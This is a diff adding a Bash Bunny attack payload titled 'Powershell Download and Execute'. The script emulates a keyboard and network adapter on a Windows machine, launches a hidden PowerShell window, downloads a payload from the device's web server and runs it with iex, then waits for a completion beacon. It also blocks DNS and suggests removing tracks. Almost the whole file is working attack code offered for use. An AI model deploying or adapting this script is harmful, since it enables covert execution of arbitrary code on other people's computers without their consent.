@@ -1,0 +1,57 @@
+#!/bin/bash
+#
+# Title:         Powershell Download and Execute
+# Author:        LowValueTarget
+# Version:       1.2
+# Category:      Powershell
+# Target:        Windows XP SP3+ (Powershell)
+# Attackmodes:   HID, RNDIS_ETHERNET
+# Firmware:      >= 1.3
+#
+# Quick HID attack to retrieve and run powershell payload from BashBunny web server
+# ensure p.txt (your powershell payload) exists in payload directory
+#
+# | Attack Stage        | Description                              |
+# | ------------------- | ---------------------------------------- |
+# | Stage 1             | Running Initial Powershell Commands      |
+# | Stage 2             | Delivering powershell payload            |
+#
+
+ATTACKMODE RNDIS_ETHERNET HID
+LED SETUP
+REQUIRETOOL gohttp
+
+GET HOST_IP
+GET SWITCH_POSITION
+
+# DEFINE DIRECTORIES
+PAYLOAD_DIR=/root/udisk/payloads/${SWITCH_POSITION}
+SERVER_LOG=/tmp/server.log
+
+# SERVER LOG
+rm -f ${SERVER_LOG}
+
+# START HTTP SERVER
+iptables -A OUTPUT -p udp --dport 53 -j DROP # disallow outgoing dns requests so server starts immediately
+/tools/gohttp/gohttp -p 80 -d /tmp/ > ${SERVER_LOG} 2>&1 &
+
+# CHECK FOR POWERSHELL
+if [ ! -f ${PAYLOAD_DIR}/p.txt ]; then
+    LED FAIL2
+    exit 1
+fi
+cp -R ${PAYLOAD_DIR}/* /tmp/ # any additional assets will be available in tmp
+
+# STAGE 1 - POWERSHELL
+LED STAGE1
+
+RUN WIN "powershell -WindowStyle Hidden \"\$web=New-Object Net.WebClient;while (\$TRUE) {If ((New-Object net.sockets.tcpclient ('${HOST_IP}','80')).Connected) {iex \$web.DownloadString('http://${HOST_IP}/p.txt');\$web.DownloadString('http://172.16.64.1/DONE');exit}}\""
+# Remove tracks in the psh payload if you wish
+
+# STAGE 2 - WAIT
+LED STAGE2
+while ! grep -Fq "GET \"/DONE\"" ${SERVER_LOG}; do
+    sleep .5
+done
+
+LED FINISH
